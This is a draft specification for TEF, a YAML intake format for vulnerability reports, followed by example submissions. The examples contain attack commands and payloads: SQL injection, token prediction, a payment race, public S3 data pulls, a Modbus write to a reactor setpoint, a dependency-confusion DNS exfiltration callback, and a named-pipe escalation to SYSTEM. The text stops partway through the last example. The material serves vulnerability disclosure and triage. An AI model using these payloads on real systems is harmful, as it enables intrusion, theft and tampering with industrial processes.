# TEF — Triageable Evidence Format

Draft Specification 0.1 — April 2026

Status: Working draft. This document describes an
emerging format seeking community input and adoption.
The intent is to mature TEF toward a stable specification
through implementation experience and feedback from
vulnerability coordination stakeholders.

## Abstract

Vulnerability disclosure lacks a standard intake format.
Publication formats exist (CVE, CSAF, OSV). Scan output
formats exist (SARIF). Test execution formats exist
(Cucumber, Nuclei). But there is no standard for what a
researcher submits when they report a software defect —
the structured evidence that a triage system needs to
classify, verify, and act on a finding.

TEF fills that gap. It is a YAML-based format for
describing software defects in a way that is human-
readable, machine-parseable, and structured enough for
automated triage.

It combines YAML's native data structure with a
Given/When/Then evidence model borrowed from behavioural
specification languages. The result is a format that
a researcher can write by hand, a parser can extract
fields from without AI, and a triage pipeline can
classify without ambiguity.

TEF is not a vulnerability database format (CVE, OSV,
CSAF). It is not a scan output format (SARIF). It is
not a test execution format (Cucumber). TEF
describes what a human found, how they found it, and what
it means — structured for intake, not for publication.

## Design Principles

1. **YAML, not a new syntax.** No custom grammar, no
   special parser. Any YAML parser reads TEF. Any text
   editor writes it.

2. **Given/When/Then as evidence structure.** Every
   defect has preconditions (given), a trigger (when),
   and an observed outcome (then). This maps to every
   defect type regardless of target platform.

3. **Presence patterns over technology assumptions.**
   TEF classifies how a defect manifests (static in an
   artefact, behavioural on execution, timing-dependent,
   inherited from a dependency) rather than assuming a
   specific technology stack.

4. **Multiple evidence scenarios per defect.** One
   finding, multiple angles. Each scenario is independent
   evidence. More scenarios, higher confidence.

5. **Metadata separate from evidence.** The `defect`
   block is structured and validatable. The `evidence`
   block is semi-structured and human-authored. The
   pipeline validates the first and interprets the second.

## Schema

```yaml
# ── Required ────────────────────────────────────

defect:
  product: <string>          # affected product name
  vendor: <string>           # vendor domain or identifier
  type: <target_type>        # see Target Types below
  cwe: <integer>             # CWE identifier
  versions: <string[]>       # affected version range
  presence: <presence_type>  # see Presence Patterns below
  os: <string>               # optional — OS/platform (Windows 11, Android 14, Ubuntu 24.04, iOS 18)

evidence:
  - title: <string>          # scenario name
    given:                   # preconditions (list of strings)
      - <string>
    when:                    # trigger actions (list of strings)
      - <string>
    then:                    # observed outcomes (list of strings)
      - <string>
    location:                # where the defect lives
      type: <string>         # endpoint, file, function, register, path, port, config, binary_offset
      value: <string>        # the specific location (URL path, file path, function name, offset)
      context: <string>      # optional — broader context (service name, module, package, device)
    reproduction:            # the actual proof artefacts
      commands: <string[]>   # exact commands run (shell, curl, etc)
      code: <string>         # vulnerable code snippet or exploit script
      request: <string>      # raw HTTP request or protocol input
      response: <string>     # raw HTTP response or protocol output
      logs: <string>         # relevant log output
      output: <string>       # tool output, crash dump, extraction result
      files:                 # supporting files (content-addressed)
        - name: <string>     # filename
          hash: <string>     # SHA-256 of file content
          type: <string>     # pcap, har, sarif, binary, config, screenshot, etc

# ── Optional ────────────────────────────────────

  description: <string>      # freeform context
  cvss: <string>             # CVSS vector or score if known
  references: <string[]>     # URLs, CVE IDs, advisory links
  attachments: <string[]>    # SHA-256 hashes of evidence files
  reproduction_rate: <string> # e.g. "15/100" for timing defects
  environment: <string>      # specific environment if relevant
```

## Target Types

```text
web             Web application
api             API or service endpoint
mobile_android  Android application (phone, tablet)
mobile_ios      iOS / iPadOS application
desktop         Client-side desktop application
server          Server software (web server, DB server, mail server, DNS)
os              Operating system or kernel
embedded        Embedded system or firmware
network         Network device or infrastructure
cloud           Cloud service or SaaS platform
ot              OT, ICS, or SCADA system
ai_ml           AI/ML model or LLM-powered application
supply_chain    Dependency or third-party component
```

`mobile_android` and `mobile_ios` are separate because their
security models differ fundamentally (sandbox, permissions,
IPC, review process). `mobile` is accepted as shorthand when
the defect applies to both.

`desktop` is the application, not the OS it runs on. An
Electron app is `desktop`. A Windows kernel vuln is `os`. A
Chromebook issue depends on whether the defect is in ChromeOS
(`os`) or a Chrome app (`desktop`).

`server` covers software that runs as a service — httpd,
PostgreSQL, Postfix, BIND. These are not web applications
(those run ON the server software).

The `defect` block also supports an optional `os` field for
the specific operating system or platform version:

```yaml
defect:
  product: BackupAgent
  vendor: backupco.com
  type: desktop
  os: Windows 10/11
  cwe: 427
```

## Presence Patterns

How the defect manifests. Determines what kind of
evidence is expected and what verification approach
is appropriate.

```text
static_artefact
  Defect exists in the artefact itself. Extractable
  and verifiable without execution. Binary strings,
  embedded keys, compiled credentials, bundled
  vulnerable components.

static_config
  Observable in configuration, headers, DNS, or
  policy settings. No exploitation needed. Missing
  headers, permissive CORS, weak TLS, open buckets.

behavioural_deterministic
  Requires execution to observe but same input always
  produces same result. Injection, traversal, SSRF,
  IDOR — send the request, get the response.

behavioural_stateful
  Requires specific application state or multi-step
  interaction to trigger. Privilege escalation,
  business logic bypass, session manipulation.

behavioural_timing
  Depends on timing or concurrency. May not reproduce
  every attempt. Race conditions, TOCTOU, double-spend.
  Should include reproduction_rate.

environmental
  Only manifests in specific environments, OS versions,
  hardware, or cloud configurations. Should include
  environment field and comparison.

design_flaw
  The design itself is insecure. Not an implementation
  bug. Unsigned updates, shared symmetric keys,
  missing rate limiting by design.

probabilistic
  Same input may produce different outcomes across runs.
  Not because of timing (that's behavioural_timing) but
  because the system itself is non-deterministic — model
  inference, probabilistic algorithms, sampling-based
  outputs. Prompt injection that works 80% of the time
  is probabilistic, not timing-dependent. Should include
  reproduction_rate and methodology for measuring it.

supply_chain
  Inherited from a third-party component. Confirmed
  by identifying the dependency version and checking
  reachability of the vulnerable code path.
```

## Evidence Structure

Each evidence entry is one scenario demonstrating the
defect from a specific angle.

**given** — what must be true before the trigger.
Authentication state, environment prerequisites,
physical access requirements, data preconditions.
For static artefacts: the artefact identity (filename,
version, hash).

**when** — the action that reveals or triggers the
defect. The request sent, the inspection performed,
the input provided. Should be specific enough for
another person to repeat.

**then** — the observed outcome. What proves the defect
exists. Must be verifiable — not "the system is
vulnerable" but "the response contains X" or "the
binary at offset Y contains Z."

### Location

Where the defect lives. Not just "the product" — the
specific place in the system where the problem exists.

```text
endpoint        URL path, API route, service port
file            filesystem path within the artefact or system
function        function, method, or class name in source
binary_offset   hex offset within a binary
register        hardware register, memory address
port            network port or service listener
config          configuration file, key, or setting
path            directory path, classpath, or module path
```

Examples by target type:

```yaml
# Web API — the endpoint
location:
  type: endpoint
  value: "GET /api/users?sort="
  context: UserPortal API, behind nginx reverse proxy

# Firmware — offset in binary
location:
  type: binary_offset
  value: "0x4A2F0"
  context: smg400-v2.4.3.bin, ARM Cortex-M4

# Mobile app — class and method
location:
  type: function
  value: "com.mobilebank.provider.AccountsProvider.query()"
  context: BankingApp Android APK, exported ContentProvider

# Desktop — named pipe
location:
  type: path
  value: "\\\\.\\pipe\\BackupAgent"
  context: BackupAgent Windows service, runs as SYSTEM

# Cloud — S3 bucket
location:
  type: config
  value: "s3://invoiceapp-prod-documents (bucket policy)"
  context: AWS eu-west-2, public read ACL

# OT/SCADA — network port
location:
  type: port
  value: "502/tcp (Modbus)"
  context: PLC X200, plant floor network segment

# Config — DNS record
location:
  type: config
  value: "_dmarc.bigcorp.co.uk TXT record"
  context: Cloudflare DNS
```

The location tells the triager exactly where to look.
Combined with the reproduction block, it answers both
"where is this?" and "how do I get there?"

### Reproduction Block

The `reproduction` block carries the actual artefacts
that prove the defect. Given/When/Then describes what
happened in structured language. Reproduction carries
the raw evidence a triager needs to verify it
independently.

All fields are optional. Include whichever are
relevant to the defect.

**commands** — the exact commands that were executed.
Shell commands, curl invocations, tool invocations.
Copied from the terminal, not paraphrased.

```yaml
reproduction:
  commands:
    - "curl -s -H 'Cookie: session=abc123' 'https://target/api/users?sort=id;SELECT+pg_sleep(5)--'"
    - "time curl -s 'https://target/api/users?sort=id' # baseline for comparison"
```

**code** — the vulnerable code snippet (from source
review or decompilation) or the exploit script used.
Not the entire file — the relevant function, block,
or configuration stanza.

```yaml
reproduction:
  code: |
    // vulnerable line — src/handlers/users.ts:47
    const query = `SELECT * FROM users ORDER BY ${req.query.sort}`;
    const result = await db.query(query);
```

**request / response** — the raw HTTP (or protocol)
exchange. Complete headers and body, not truncated.
For non-HTTP protocols, the equivalent wire-level
content.

```yaml
reproduction:
  request: |
    GET /api/users?sort=id;SELECT+pg_sleep(5)-- HTTP/1.1
    Host: target.acme-corp.com
    Cookie: session=abc123
    Accept: application/json
  response: |
    HTTP/1.1 200 OK
    Content-Type: application/json
    X-Response-Time: 5023ms

    {"users": [...]}
```

**logs** — relevant log entries from the application,
system, or infrastructure that corroborate the defect.
Timestamped where possible.

```yaml
reproduction:
  logs: |
    2026-04-08 14:23:17 [WARN] slow query: 5002ms
      SELECT * FROM users ORDER BY id;SELECT pg_sleep(5)--
    2026-04-08 14:23:17 [INFO] request completed: GET /api/users 200
```

**output** — raw output from tools, crash dumps,
extraction results, or analysis. Binwalk output,
strings extraction, disassembly, fuzzer crash logs.

```yaml
reproduction:
  output: |
    $ strings -n 8 smg400-v2.4.3.bin | grep -i pass
    SmartM3t3r!
    password=SmartM3t3r!
    default_password
```

**files** — references to attached evidence files.
Files are stored content-addressed (SHA-256 hash).
The hash in TEF matches the file in storage — this
is how the custody chain binds the evidence to the
submission.

```yaml
reproduction:
  files:
    - name: exploit.py
      hash: "sha256:9f86d0..."
      type: script
    - name: crash.pcap
      hash: "sha256:a7ffc6..."
      type: pcap
    - name: firmware-strings.txt
      hash: "sha256:e3b0c4..."
      type: extraction
```

File types: `script`, `pcap`, `har`, `sarif`, `binary`,
`config`, `screenshot`, `log`, `certificate`, `core_dump`,
`extraction`, `other`.

### Good Then Statements

Verifiable:

```text
- response body contains "PostgreSQL 15.2"
- file at offset 0x4A2F0 contains "SmartM3t3r!"
- status code is 200, response includes other user's data
- both settlement requests return HTTP 200
```

Not verifiable:

```text
- the system is vulnerable
- this could be exploited
- an attacker might gain access
- security is weak
```

## Completeness

A TEF submission is considered complete when:

1. The `defect` block has all required fields populated
2. At least one evidence scenario exists
3. Every scenario has at least one entry in given,
   when, and then
4. The then statements are specific enough for another
   person to verify independently
5. The presence pattern matches the evidence structure
   (e.g. a static_artefact submission should have
   artefact identification in the given block, not
   authentication state)

## Validation

TEF can be validated at two levels:

**Schema validation** — the YAML structure matches the
schema. Required fields present, types correct, enums
valid. Machine-checkable, no AI needed.

**Completeness validation** — the evidence is sufficient
for triage. Given/when/then are meaningful, then
statements are verifiable, presence pattern is
consistent with evidence structure. Requires semantic
understanding — AI-assisted or human review.

## Relationship to Other Formats

TEF is an intake format. It feeds into triage and
classification. After classification, findings are
published in other formats:

```text
                    ┌─────────┐
   Researcher ──→   │   TEF   │  ← intake
                    └────┬────┘
                         │
                    ┌────┴────┐
                    │ TRIAGE  │  ← classification
                    └────┬────┘
                         │
              ┌──────────┼──────────┐
              │          │          │
         ┌────┴───┐ ┌───┴────┐ ┌───┴───┐
         │  CVE   │ │  CSAF  │ │  OSV  │
         │(publish)│ │(advise)│ │(index)│
         └────────┘ └────────┘ └───────┘
```

TEF does not replace CVE records, CSAF advisories, or
OSV entries. It captures what the researcher observed.
The triage system turns that into a classified finding.
The publication system turns that into an advisory in
whatever format the ecosystem needs.

## Extensibility

TEF is YAML. Additional fields can be added without
breaking existing parsers. Unknown fields are ignored
by consumers that don't understand them.

Potential extensions:

- `nuclei:` block for HTTP-target executable test specs
- `sarif_ref:` pointer to a SARIF result that generated
  this submission
- `custody:` block for chain of custody metadata
- `brs:` block for pre-scored BRS dimensions

Extensions should be namespaced to avoid collision.

## Conformance

A TEF document is conformant if it passes schema
validation against the required fields defined above.
Producers SHOULD include all required fields. Consumers
MUST accept documents with unknown fields and MUST NOT
reject them.

A TEF-aware triage system SHOULD implement both schema
validation and completeness validation. Schema validation
is machine-checkable. Completeness validation requires
semantic understanding and MAY be AI-assisted.

## Examples

The following are complete, conformant TEF documents
covering different target types, presence patterns,
and evidence structures.

### Example 1 — Web API, Behavioural Deterministic

```yaml
defect:
  product: UserPortal
  vendor: acme-corp.com
  type: api
  cwe: 89
  versions: [2.3.0, 2.3.1, 2.4.0]
  presence: behavioural_deterministic

evidence:
  - title: Confirm injection via time delay
    location:
      type: endpoint
      value: "GET /api/users?sort="
      context: UserPortal REST API, behind Cloudflare
    given:
      - authenticated as "viewer" role
    when:
      - GET /api/users?sort=id;SELECT+pg_sleep(5)--
    then:
      - response delayed by approximately 5 seconds
      - status code 200
    reproduction:
      commands:
        - "time curl -s -H 'Cookie: session=eyJ...' 'https://portal.acme-corp.com/api/users?sort=id;SELECT+pg_sleep(5)--'"
        - "time curl -s -H 'Cookie: session=eyJ...' 'https://portal.acme-corp.com/api/users?sort=id'  # baseline"
      request: |
        GET /api/users?sort=id;SELECT+pg_sleep(5)-- HTTP/1.1
        Host: portal.acme-corp.com
        Cookie: session=eyJ...
        Accept: application/json
      response: |
        HTTP/1.1 200 OK
        Content-Type: application/json
        X-Response-Time: 5023ms

        {"users": [{"id": 1, "name": "..."}], "total": 47}
      code: |
        // src/handlers/users.ts:47
        const sortParam = req.query.sort;
        const query = `SELECT * FROM users ORDER BY ${sortParam}`;

  - title: Extract database version
    given:
      - authenticated as "viewer" role
    when:
      - GET /api/users?sort=id;SELECT+version()--
    then:
      - response body contains "PostgreSQL 15.2"
    reproduction:
      commands:
        - "curl -s -H 'Cookie: session=eyJ...' 'https://portal.acme-corp.com/api/users?sort=id;SELECT+version()--' | jq ."

  - title: Viewer role is sufficient
    given:
      - authenticated as "viewer" (lowest privilege)
    when:
      - repeat injection from viewer session
    then:
      - injection succeeds without elevated privilege
      - no difference in behaviour between viewer and admin sessions
```

### Example 2 — Embedded Firmware, Static Artefact

```yaml
defect:
  product: SMG-400 Gateway
  vendor: smartmeter-uk.co.uk
  type: embedded
  cwe: 798
  versions: [firmware 2.1.0 through 2.4.3]
  presence: static_artefact
  description: >
    Hardcoded UART debug credentials compiled into
    every unit across a 340,000-unit deployment.

evidence:
  - title: Extract credentials from binary
    location:
      type: binary_offset
      value: "0x4A2F0"
      context: smg400-v2.4.3.bin, ARM Cortex-M4, BusyBox Linux
    given:
      - firmware image smg400-v2.4.3.bin
      - SHA256 a7f3c8e...
    when:
      - extract printable strings from binary
    then:
      - "SmartM3t3r!" at offset 0x4A2F0
      - "admin" at offset 0x4A2E0
    reproduction:
      commands:
        - "strings -n 8 smg400-v2.4.3.bin | grep -i pass"
        - "hexdump -C -s 0x4A2E0 -n 32 smg400-v2.4.3.bin"
      output: |
        $ strings -n 8 smg400-v2.4.3.bin | grep -i pass
        SmartM3t3r!
        password=SmartM3t3r!
        default_password
      files:
        - name: smg400-v2.4.3.bin
          hash: "sha256:a7f3c8e..."
          type: binary

  - title: Credentials grant root shell
    location:
      type: port
      value: "J3 UART header, 115200 baud"
      context: physical PCB, 4-pin header near SoC
    given:
      - physical access to J3 UART header
      - serial connection at 115200 baud 8N1
    when:
      - enter admin / SmartM3t3r! at login prompt
    then:
      - root shell received
      - whoami returns "root"
    reproduction:
      commands:
        - "screen /dev/ttyUSB0 115200"
      output: |
        SMG-400 login: admin
        Password: ********
        # whoami
        root
        # cat /etc/mqtt/credentials.conf
        mqtt_user=smg_gateway
        mqtt_pass=GatewayMQTT2024!
      logs: |
        Jan  1 00:00:03 smg400 login[142]: LOGIN admin FROM ttyS0

  - title: Identical across fleet
    given:
      - second unit, serial SMG-2024-00892
    when:
      - same UART login procedure
    then:
      - same credentials accepted
      - root shell on second unit
    reproduction:
      output: |
        SMG-400 login: admin
        Password: ********
        # hostname
        smg400-00892
```

### Example 3 — Mobile App, Design Flaw

```yaml
defect:
  product: HealthApp
  vendor: healthapp.co.uk
  type: mobile
  cwe: 330
  versions: [iOS 3.0.0, Android 3.0.0]
  presence: design_flaw

evidence:
  - title: Token generation uses timestamp seed
    location:
      type: function
      value: "com.healthapp.auth.TokenGenerator.generateResetToken()"
      context: HealthApp Android APK, jadx decompilation
    given:
      - decompiled application binary
    when:
      - locate password reset token generation
    then:
      - Random() seeded with System.currentTimeMillis()
      - no additional entropy source
    reproduction:
      commands:
        - "jadx -d healthapp-decompiled healthapp-3.0.0.apk"
        - "grep -rn 'Random' healthapp-decompiled/sources/com/healthapp/auth/"
      code: |
        // com/healthapp/auth/TokenGenerator.java:34
        public String generateResetToken(String userId) {
            Random rng = new Random(System.currentTimeMillis());
            byte[] tokenBytes = new byte[16];
            rng.nextBytes(tokenBytes);
            return Base64.encodeToString(tokenBytes, Base64.URL_SAFE | Base64.NO_WRAP);
        }
      files:
        - name: healthapp-3.0.0.apk
          hash: "sha256:c4f2e91..."
          type: binary

  - title: Token predictable from request time
    given:
      - password reset requested at known timestamp
    when:
      - generate candidate tokens for 1-second window
    then:
      - correct token found within 1000 candidates
      - password reset succeeds with predicted token
    reproduction:
      commands:
        - "python3 predict_token.py --timestamp 1712678400000 --window 1000"
        - "curl -s -X POST 'https://api.healthapp.co.uk/auth/reset-confirm' -d '{\"token\":\"<predicted>\",\"new_password\":\"test1234\"}'"
      output: |
        $ python3 predict_token.py --timestamp 1712678400000 --window 1000
        [*] Generating candidates for 1712678400000 ± 500ms
        [*] 1000 candidates generated
        [*] Testing against https://api.healthapp.co.uk/auth/reset-confirm
        [+] Valid token found at offset +237ms: dG9rZW4tMjM3bXM=
        [+] Password reset successful for user test-victim@example.com
      files:
        - name: predict_token.py
          hash: "sha256:b8e4a17..."
          type: script
```

### Example 4 — API, Behavioural Timing

```yaml
defect:
  product: PayFlow Engine
  vendor: payflow.io
  type: api
  cwe: 362
  versions: [3.1.0 through 3.4.2]
  presence: behavioural_timing
  reproduction_rate: "15/100"

evidence:
  - title: Double settlement via concurrent requests
    location:
      type: endpoint
      value: "POST /api/settle"
      context: PayFlow settlement API, no mutex on transaction lock
    given:
      - authenticated as "merchant" role
      - pending transaction txn-test-001
    when:
      - send 2 concurrent POST /api/settle within 50ms
      - both carry idempotency key txn-test-001
    then:
      - both requests return HTTP 200
      - ledger shows 2 entries for txn-test-001
      - settled amount is double the transaction value
    reproduction:
      commands:
        - "curl -s -X POST 'https://api.payflow.io/api/settle' -H 'Authorization: Bearer eyJ...' -H 'Content-Type: application/json' -d '{\"txn_id\":\"txn-test-001\",\"amount\":500}' & curl -s -X POST 'https://api.payflow.io/api/settle' -H 'Authorization: Bearer eyJ...' -H 'Content-Type: application/json' -d '{\"txn_id\":\"txn-test-001\",\"amount\":500}' & wait"
        - "curl -s -H 'Authorization: Bearer eyJ...' 'https://api.payflow.io/api/ledger?txn_id=txn-test-001' | jq ."
      request: |
        POST /api/settle HTTP/1.1
        Host: api.payflow.io
        Authorization: Bearer eyJ...
        Content-Type: application/json

        {"txn_id": "txn-test-001", "amount": 500}
      response: |
        HTTP/1.1 200 OK
        Content-Type: application/json
        X-Request-Id: req-88a1

        {"status": "settled", "txn_id": "txn-test-001", "amount": 500, "ledger_id": "led-0041"}
      output: |
        $ curl -s 'https://api.payflow.io/api/ledger?txn_id=txn-test-001' | jq .
        {
          "entries": [
            {"ledger_id": "led-0041", "amount": 500, "settled_at": "2026-04-08T14:23:17Z"},
            {"ledger_id": "led-0042", "amount": 500, "settled_at": "2026-04-08T14:23:17Z"}
          ],
          "total_settled": 1000
        }

  - title: Reproduction rate measured
    given:
      - same setup repeated 100 times
    when:
      - measure successful double settlements
    then:
      - 12 to 18 of 100 attempts succeed
      - timing window between 20ms and 60ms
    reproduction:
      commands:
        - "python3 race_settle.py --target https://api.payflow.io --iterations 100 --delay-ms 40"
      output: |
        $ python3 race_settle.py --target https://api.payflow.io --iterations 100 --delay-ms 40
        [*] Running 100 iterations with 40ms delay window
        [+] Double settlement: iteration 7   (38ms delta)
        [+] Double settlement: iteration 12  (27ms delta)
        [+] Double settlement: iteration 23  (44ms delta)
        [+] Double settlement: iteration 31  (33ms delta)
        [+] Double settlement: iteration 45  (51ms delta)
        [+] Double settlement: iteration 48  (29ms delta)
        [+] Double settlement: iteration 56  (42ms delta)
        [+] Double settlement: iteration 61  (35ms delta)
        [+] Double settlement: iteration 67  (22ms delta)
        [+] Double settlement: iteration 74  (46ms delta)
        [+] Double settlement: iteration 78  (31ms delta)
        [+] Double settlement: iteration 83  (39ms delta)
        [+] Double settlement: iteration 91  (28ms delta)
        [+] Double settlement: iteration 95  (55ms delta)
        [+] Double settlement: iteration 99  (41ms delta)
        [*] Result: 15/100 successful (15.0%)
        [*] Timing window: 22ms - 55ms (mean: 36ms)
      files:
        - name: race_settle.py
          hash: "sha256:d3f1a09..."
          type: script
```

### Example 5 — Cloud, Static Configuration

```yaml
defect:
  product: InvoiceStore
  vendor: invoiceapp.com
  type: cloud
  cwe: 732
  versions: [current deployment]
  presence: static_config

evidence:
  - title: Bucket publicly listable
    location:
      type: config
      value: "s3://invoiceapp-prod-documents (bucket policy)"
      context: AWS eu-west-2, public-read ACL on bucket
    given:
      - S3 bucket invoiceapp-prod-documents
    when:
      - request listing without credentials
    then:
      - listing returns 47,000+ objects
      - keys follow invoices/{year}/{customer_id}.pdf
    reproduction:
      commands:
        - "aws s3 ls s3://invoiceapp-prod-documents/ --no-sign-request --region eu-west-2"
        - "aws s3 ls s3://invoiceapp-prod-documents/ --no-sign-request --region eu-west-2 --recursive | wc -l"
        - "aws s3api get-bucket-policy --bucket invoiceapp-prod-documents --no-sign-request --region eu-west-2 | jq ."
      output: |
        $ aws s3 ls s3://invoiceapp-prod-documents/ --no-sign-request --region eu-west-2
                           PRE invoices/
                           PRE templates/
                           PRE exports/

        $ aws s3 ls s3://invoiceapp-prod-documents/invoices/ --no-sign-request --recursive | head -5
        2026-01-15 09:12:33    284731 invoices/2026/cust-10042.pdf
        2026-01-15 09:12:34    291044 invoices/2026/cust-10043.pdf
        2026-01-15 09:12:35    276218 invoices/2026/cust-10044.pdf
        2026-01-15 09:12:36    303512 invoices/2026/cust-10045.pdf
        2026-01-15 09:12:37    289771 invoices/2026/cust-10046.pdf

        $ aws s3 ls s3://invoiceapp-prod-documents/ --no-sign-request --recursive | wc -l
        47283

  - title: Objects publicly readable
    given:
      - bucket listing from previous scenario
    when:
      - GET a sample of 5 invoice PDFs
    then:
      - PDFs contain customer full name
      - billing address present
      - partial payment card number visible
    reproduction:
      commands:
        - "aws s3 cp s3://invoiceapp-prod-documents/invoices/2026/cust-10042.pdf /tmp/sample.pdf --no-sign-request --region eu-west-2"
        - "pdftotext /tmp/sample.pdf - | head -20"
      output: |
        $ pdftotext /tmp/sample.pdf - | head -20
        INVOICE #INV-2026-10042
        Date: 15 January 2026

        Bill To:
        James Richardson
        42 Pembroke Lane
        Bristol BS1 5TQ
        United Kingdom

        Payment Method: Visa ending 4829
      files:
        - name: sample-invoices-redacted.zip
          hash: "sha256:f1e8b34..."
          type: extraction
```

### Example 6 — OT/SCADA, Behavioural Deterministic

```yaml
defect:
  product: IndustrialPLC X200
  vendor: plcmanufacturer.com
  type: ot
  cwe: 306
  versions: [firmware 4.0 through 4.3]
  presence: behavioural_deterministic

evidence:
  - title: Read process values without authentication
    location:
      type: port
      value: "502/tcp (Modbus)"
      context: PLC X200, plant floor network segment 10.20.30.0/24
    given:
      - network access to PLC on port 502
    when:
      - Modbus TCP Read Holding Registers (function 03)
      - read registers 0 through 99
    then:
      - all register values returned
      - no authentication challenge
      - process values readable (temperatures, pressures)
    reproduction:
      commands:
        - "modbus read --ip 10.20.30.14 --port 502 --type holding --start 0 --count 100"
        - "nmap -sV -p 502 10.20.30.14"
      output: |
        $ modbus read --ip 10.20.30.14 --port 502 --type holding --start 0 --count 100
        Connected to 10.20.30.14:502 (unit 1)
        Register  0: 0x0172  (370)   # reactor_temp_celsius
        Register  1: 0x0064  (100)   # reactor_pressure_kpa
        Register  2: 0x002C  (44)    # coolant_flow_lpm
        Register  3: 0x0001  (1)     # reactor_status (1=running)
        ...
        Register 40: 0x015E  (350)   # setpoint_temp_celsius
        Register 41: 0x005A  (90)    # setpoint_pressure_kpa
        ...
        Register 99: 0x0000  (0)
        100 registers read, no authentication required

        $ nmap -sV -p 502 10.20.30.14
        PORT    STATE SERVICE  VERSION
        502/tcp open  modbus   Modbus TCP (unit ID 1)
      files:
        - name: modbus-full-dump.pcap
          hash: "sha256:e7c4d28..."
          type: pcap

  - title: Write to control registers
    given:
      - same network access, no credentials
    when:
      - Modbus TCP Write Single Register (function 06)
      - write to register 40 (setpoint control)
    then:
      - write accepted
      - physical process setpoint changed
      - no authorisation check
    reproduction:
      commands:
        - "modbus write --ip 10.20.30.14 --port 502 --type holding --register 40 --value 999"
        - "modbus read --ip 10.20.30.14 --port 502 --type holding --start 40 --count 1"
      output: |
        $ modbus write --ip 10.20.30.14 --port 502 --type holding --register 40 --value 999
        Connected to 10.20.30.14:502 (unit 1)
        Write register 40 = 999 (0x03E7): OK
        No authentication challenge received

        $ modbus read --ip 10.20.30.14 --port 502 --type holding --start 40 --count 1
        Register 40: 0x03E7  (999)   # setpoint_temp_celsius [MODIFIED]
```

### Example 7 — Supply Chain, Dependency

```yaml
defect:
  product: BuildPipeline
  vendor: techcorp.com
  type: supply_chain
  cwe: 427
  versions: [all builds using current .npmrc]
  presence: supply_chain
  references:
    - https://medium.com/@alex.birsan/dependency-confusion-...

evidence:
  - title: Internal package name on public registry
    location:
      type: file
      value: "package.json → @techcorp/auth-utils"
      context: techcorp/platform monorepo, .npmrc points to both public and private registries
    given:
      - internal package @techcorp/auth-utils
      - public npm registry
    when:
      - query npm for @techcorp/auth-utils
    then:
      - package exists, published by unaffiliated user
      - package has preinstall script
    reproduction:
      commands:
        - "npm view @techcorp/auth-utils --registry https://registry.npmjs.org"
        - "npm view @techcorp/auth-utils scripts --registry https://registry.npmjs.org"
        - "npm view @techcorp/auth-utils maintainers --registry https://registry.npmjs.org"
      output: |
        $ npm view @techcorp/auth-utils --registry https://registry.npmjs.org
        @techcorp/auth-utils@9.0.0 | ISC | deps: none | versions: 1
        keywords: auth, utils

        $ npm view @techcorp/auth-utils scripts --registry https://registry.npmjs.org
        { preinstall: 'node preinstall.js' }

        $ npm view @techcorp/auth-utils maintainers --registry https://registry.npmjs.org
        [ 'security-researcher-01 <researcher@example.com>' ]
      code: |
        // .npmrc (from repository root)
        @techcorp:registry=https://npm.internal.techcorp.com/
        registry=https://registry.npmjs.org/
        // NOTE: @techcorp scope configured, but npm falls back to
        // public registry when internal registry is unreachable

  - title: Build fetches public version
    given:
      - CI pipeline with mixed registry config
    when:
      - trigger clean build
    then:
      - npm resolves from public registry
      - preinstall script executes in CI
      - DNS callback confirms code execution
    reproduction:
      commands:
        - "npm install --ignore-scripts=false 2>&1 | grep auth-utils"
      output: |
        $ npm install --ignore-scripts=false 2>&1 | grep auth-utils
        npm http fetch GET 200 https://registry.npmjs.org/@techcorp/auth-utils 38ms
        npm info run @techcorp/auth-utils@9.0.0 preinstall node preinstall.js
      logs: |
        2026-04-08 14:31:02 [DNS] callback received: ci-build-7f3a.techcorp-exfil.researcher.example.com
        2026-04-08 14:31:02 [DNS] TXT payload: hostname=ci-runner-14, user=ci-agent, node=v20.11.0

  - title: Reachability confirmed
    given:
      - public package installed in CI
    when:
      - preinstall script runs
    then:
      - script has network access
      - script has filesystem access to build artefacts
      - CI environment variables accessible
    reproduction:
      output: |
        DNS callback payload (base64-decoded):
        {
          "hostname": "ci-runner-14",
          "user": "ci-agent",
          "cwd": "/home/ci-agent/builds/techcorp/platform",
          "node_version": "v20.11.0",
          "env_keys": ["CI_TOKEN", "NPM_TOKEN", "AWS_ACCESS_KEY_ID", "GITHUB_TOKEN"],
          "has_network": true,
          "build_artifacts": ["dist/", "packages/", ".env.ci"]
        }
      files:
        - name: dns-callback-log.txt
          hash: "sha256:a2b9c87..."
          type: log
```

### Example 8 — Desktop, Behavioural Stateful

```yaml
defect:
  product: BackupAgent
  vendor: backupco.com
  type: desktop
  cwe: 269
  versions: [Windows 3.4.0, 3.5.0]
  presence: behavioural_stateful

evidence:
  - title: Named pipe has permissive DACL
    location:
      type: path
      value: "\\\\.\\pipe\\BackupAgent"
      context: BackupAgent Windows service, runs as NT AUTHORITY\SYSTEM
    given:
      - BackupAgent service running as SYSTEM
      - pipe \\.\pipe\BackupAgent created at service start
    when:
      - enumerate pipe DACL as low-privilege user
    then:
      - Everyone has FILE_ALL_ACCESS
      - any user can connect
    reproduction:
      commands:
        - "[System.IO.Directory]::GetFiles('\\\\.\\pipe\\') | Select-String 'BackupAgent'"
        - "pipelist.exe /accepteula | findstr BackupAgent"
        - "accesschk.exe -wup \\\\?\\pipe\\BackupAgent /accepteula"
      output: |
        PS C:\Users\lowpriv> pipelist.exe /accepteula | findstr BackupAgent
        BackupAgent                 856     1

        PS C:\Users\lowpriv> accesschk.exe -wup \\?\pipe\BackupAgent /accepteula
        \\?\pipe\BackupAgent
          RW Everyone
               FILE_ALL_ACCESS
          RW NT AUTHORITY\SYSTEM
               FILE_ALL_ACCESS
          RW BUILTIN\Administrators
               FILE_ALL_ACCESS

  - title: Impersonation escalates to SYSTEM
    given:
      - connected to pipe as low-privilege user
    when:
      - trigger service ImpersonateNamedPipeClient call
      - service performs file operation while impersonating
    then:
      - file operation executes as SYSTEM
      - arbitrary write confirmed under SYSTEM context
    reproduction:
      commands:
        - "C:\\Tools\\pipe_exploit.exe --pipe BackupAgent --action write --target C:\\Windows\\Temp\\proof.txt"
        - "type C:\\Windows\\Temp\\proof.txt"
        - "icacls C:\\Windows\\Temp\\proof.txt"
      output: |
        C:\Users\lowpriv> whoami
        desktop-pc\lowpriv

        C:\Users\lowpriv> C:\Tools\pipe_exploit.exe --pipe BackupAgent --action write --target C:\Windows\Temp\proof.txt
        [*] Connecting to \\.\pipe\BackupAgent
        [*] Connected. Waiting for impersonation...
        [*] Service called ImpersonateNamedPipeClient
        [*] Writing proof file as impersonated context
        [+] Write successful. Token: NT AUTHORITY\SYSTEM

        C:\Users\lowpriv> type C:\Windows\Temp\proof.txt
